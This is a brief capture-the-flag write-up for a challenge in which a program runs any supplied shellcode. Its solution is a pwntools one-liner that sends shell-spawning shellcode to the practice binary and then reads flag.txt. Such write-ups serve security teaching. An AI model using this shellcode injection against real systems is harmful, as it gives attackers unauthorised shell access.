## Question
This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5 on the shell server. Source.

## Solution
Same as what it says on the tin, this program execute whatever shellcode you enter. We can use the shellcode form pwntools to do this.
`python -c "from pwn import *;p = process('./vuln');p.sendlineafter('\n', asm(shellcraft.i386.linux.sh()));p.interactive()"`

By typing the above, we spawn a shell with root priviledge and `cat flag.txt`.
